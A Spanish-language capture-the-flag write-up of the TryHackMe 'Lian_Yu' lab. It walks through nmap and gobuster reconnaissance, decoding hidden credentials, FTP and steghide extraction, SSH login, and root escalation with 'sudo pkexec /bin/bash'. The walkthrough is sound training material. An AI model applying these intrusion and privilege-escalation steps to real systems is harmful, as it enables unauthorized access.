# Write Up - Lian_Yu

### **Nmap**

Primero escanearemos los puertos de la máquina a la que nos hemos conectado utilizando el programa Nmap y ejecutando el siguiente comando:

```bash
# Nmap 7.93 scan initiated Tue Jan 17 06:46:04 2023 as: nmap -sCV -n -Pn -p- --min-rate=5000 -oN AllPorts 10.10.162.216
Nmap scan report for 10.10.162.216
Host is up (0.32s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.2
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 5650bd11efd4ac5632c3ee733ede87f4 (DSA)
|   2048 396f3a9cb62dad0cd86dbe77130725d6 (RSA)
|   256 a66996d76d6127967ebb9f83601b5212 (ECDSA)
|_  256 3f437675a85aa6cd33b066420491fea0 (ED25519)
80/tcp    open  http    Apache httpd
|_http-title: Purgatory
|_http-server-header: Apache
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          42200/tcp   status
|   100024  1          42973/udp6  status
|   100024  1          47036/udp   status
|_  100024  1          53752/tcp6  status
42200/tcp open  status  1 (RPC #100024)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan 17 06:46:58 2023 -- 1 IP address (1 host up) scanned in 54.51 seconds
```

| Argumentos | Descripción |
| --- | --- |
| -sCV | Utiliza los script que trae Nmap por defecto aparte de detectar las versiones de los servicios encontrados |
| -n | Evita realizar la resolución DNS. |
| -Pn | Deshabilita la búsqueda del host, solamente manda los paquetes a los puertos. |
| -p- | Indica que analice los puertos del 1 al 65535 |
| —min-rate= | Indica la cantidad de paquetes que se mandan por segundo. |
| -oN | Sirve para exportar el resultado a un archivo con formato normal. |

Como podemos observar estos son los siguientes puertos abiertos:

| Puerto | Servicio | Versión |
| --- | --- | --- |
| 21 | ftp | vsft*****0.2 |
| 22 | ssh | Open*******p1 |
| 80 | http | Ap**********d |
| 111 | rpcbind | rp*******-* |
| 42200 | status | OSs: U***, ****x |

Tras haber realizado el análisis de puerto, lo primero que comprobaremos será acceder a la página web para recabar información.

![Untitled](Writeup/img/Untitled.png)

### Gobuster

Como se puede comprobar, no hay información relevante, por lo que usaremos la herramienta gobuster para dictar los directorios que contiene la página web.

```bash
gobuster dir -u http://10.10.162.216:80/ -w /usr/share/wordlists/dirb/b*****t
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.162.216:80/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/b*****t
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/01/20 19:07:57 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/island               (Status: 301) [Size: 236] [--> http://10.10.162.216/is***d/]
/server-status        (Status: 403) [Size: 199]                                   
                                                                                  
===============================================================
2023/01/20 19:09:44 Finished
===============================================================
```

| Argumentos | Descripción |
| --- | --- |
| dir | Realiza un ataque de fuerza bruta |
| -u | Indica la URL a la que realizar el ataque |
| -w | Indica el diccionario que utilizar |

Se puede comprobar que existe un directorio que se llama is***d, por lo que buscaremos en la web que se encuentra dentro de esta.

![Untitled](Writeup/img/Untitled%201.png)

Como se puede comprobar, se encuentra un texto oculto el cual dice ser un código, por lo que lo tendremos en cuenta más adelante, por ahora al ver que en este directorio no hay nada más, seguiremos con el escaneo de directorios, pero en este caso empezando desde /is***d.

```bash
gobuster dir -u http://10.10.162.216:80/is***d/ -w /usr/share/wordlists/SecLists/Fuzzing/4-d*************99.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.162.216:80/is***d/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Fuzzing/4-d*************99.txt 
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/01/20 19:20:24 Starting gobuster in directory enumeration mode
===============================================================
/2**0                 (Status: 301) [Size: 241] [--> http://10.10.162.216/is***d/2**0/]
Progress: 3820 / 10001 (38.20%)                                                 Progress: 3920                                                                                       
===============================================================
2023/01/20 19:21:14 Finished
===============================================================
```

Utilizando un diccionario distinto, se puede encontrar otro directorio más, por lo que iremos a la página web para ver que información podemos obtener.

![Untitled](Writeup/img/Untitled%202.png)

Dentro de la web, hemos encontrado utilizando el inspector de elementos, un comentario del desarrollador, en el que nos indica que podemos obtener un ticket, por lo que intentaremos buscarlo listando más directorios.

```bash
gobuster dir -u http://10.10.162.216:80/is***d/2**6 -w /usr/share/wordlists/dirbuster/dir*******************ium.txt -x t*****
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.162.216:80/is***d/2**6
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/dir*******************ium.txt
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/01/20 19:20:24 Starting gobuster in directory enumeration mode
===============================================================
/gr********w.t*****              (Status: 200) [Size: 71] [--> http://10.10.162.216/is***d/2**0/gr********w.t***** ]
Progress: 441077 / 441122 (99.99%)                                                 Progress: 441121                                                                                       
===============================================================
2023/01/20 19:41:22 Finished
===============================================================
```

| Argumento | Descripción |
| --- | --- |
| -x | Indica la extensión que se busca. |

Una vez encontrado otro directorio, se buscará dentro de este para buscar más información.

![Untitled](Writeup/img/Untitled%203.png)

Una vez accedemos a la web, podemos comprobar que existe un código que seguramente este encriptado, por lo que iremos a la página web [dcode](https://www.dcode.fr/) para analizarlo y desencriptarlo.

![Untitled](Writeup/img/Untitled%204.png)

Al analizarlo, nos indica que posiblemente esta encriptado con uno de estos métodos, así que probaremos con todos para averiguar cual es exactamente.

![Untitled](Writeup/img/Untitled%205.png)

Tras probar los distintos métodos hemos conseguido una posible contraseña, por lo que intentaremos acceder por ftp con el primer código que encontramos oculto como usuario y este último como contraseña.

```bash
ftp 10.10.162.216
Connected to 10.10.162.216.
220 (vsFTPd 3.0.2)
Name (10.10.162.216:recirof): v*******e
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Tras conectarse por ftp tendremos que listar los directorios y descargar los archivos encontrados.

```bash
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05  2020 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
226 Directory send OK.
ftp> get Leave_me_alone.png
local: Leave_me_alone.png remote: Leave_me_alone.png
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for Leave_me_alone.png (511720 bytes).
226 Transfer complete.
511720 bytes received in 0.29 secs (1.6575 MB/s)
ftp> get Queen's_Gambit.png
local: Queen's_Gambit.png remote: Queen's_Gambit.png
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for Queen's_Gambit.png (549924 bytes).
226 Transfer complete.
549924 bytes received in 0.29 secs (1.7778 MB/s)
ftp> get aa.jpg
local: aa.jpg remote: aa.jpg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for aa.jpg (191026 bytes).
226 Transfer complete.
191026 bytes received in 0.22 secs (856.5183 kB/s)
```

Como se puede comprobar, existe una imagen corrupta, la cual es ‘Leave_me_alone.png’ por lo que entraremos con un editor hexadecimal para arreglar el fichero.

```bash
hexedit "fichero"
```

![Untitled](Writeup/img/Untitled%206.png)

Como se puede comprobar, el archivo tiene el magic number cambiado, por lo que se procederá a arreglarse y guardar los cambios para poder acceder a la información de la imagen.

### Steghide

Una vez hemos accedido a la imagen y hemos encontrado la contraseña, utilizaremos la herramienta steghide con el archivo aa.jpg y usaremos la contraseña encontrada previamente.

```bash
steghide extract -sf aa.jpg
Anotar salvoconducto: 
anot� los datos extra�dos e/"**.zip".
```

| Argumentos | Descripción |
| --- | --- |
| extract | Sirve para extraer los archivos ocultos de un fichero. |
| -sf | Sirve para declarar que el archivo contiene datos adjuntos. |

Tras obtener el archivo, comprobaremos que es un .zip, por lo que lo extraeremos y accederemos a la información que contiene.

```bash
cat s***o
M*******n
```

Obteniendo la información de uno de los ficheros obtenemos lo que parece ser una contraseña, el usuario podemos encontrarlo cuando nos conectamos por ftp y listamos los directorios, por lo tanto intentaremos conectarnos por ssh con las credenciales que hemos obtenido.

```bash
ssh s***e@10.10.162.216
s***e@10.10.162.216's password: 
			      Way To SSH...
			  Loading.........Done.. 
		   Connecting To Lian_Yu  Happy Hacking

██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██████╗ 
██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚════██╗
██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗   █████╔╝
██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ 
╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████╗
 ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝

	██╗     ██╗ █████╗ ███╗   ██╗     ██╗   ██╗██╗   ██╗
	██║     ██║██╔══██╗████╗  ██║     ╚██╗ ██╔╝██║   ██║
	██║     ██║███████║██╔██╗ ██║      ╚████╔╝ ██║   ██║
	██║     ██║██╔══██║██║╚██╗██║       ╚██╔╝  ██║   ██║
	███████╗██║██║  ██║██║ ╚████║███████╗██║   ╚██████╔╝
	╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝    ╚═════╝  #

s***e@LianYu:~$
```

Una vez nos hemos conectado, listaremos las rutas a las que tenemos acceso para encontrar el user.txt

```bash
s***e@LianYu:~$ cat user.txt
THM{******************************T}
			--Felicity Smoak
```

Tras encontrar la primera flag, tendremos que realizar una escalada de privilegios para tener acceso al archivo root.txt, para realizar esto listaremos los servicios en los que tenemos permiso como sudo, para intentar aprovecharlo.

```bash
s***e@LianYu:~$ sudo -l
[sudo] password for s***e: 
Matching Defaults entries for s***e on LianYu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
```

Podemos comprobar que podemos ejecutar el comando pkexec como sudo, por lo tanto ejecutaremos el /bin/bash para tener acceso a una terminal con permisos de root.

```bash
s***e@LianYu:~$ sudo pkexec /bin/bash
root@LianYu:~#
```

Ahora nos dirigiremos a la ruta en la cual esta el archivo root.txt y haremos un cat para visualizar la información de este archivo.

```bash
root@LianYu:~# cat root.txt
                          Mission accomplished

You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 

THM{MY_W*************************************************************D34D}
									      --DEATHSTROKE

Let me know your comments about this machine :)
I will be available @twitter @User6825
```

Como se puede comprobar, se ha obtenido la flag del root.txt

## Contact

[📧 danielruizraposo02@gmail.com](mailto:danielruizraposo02@mail.com)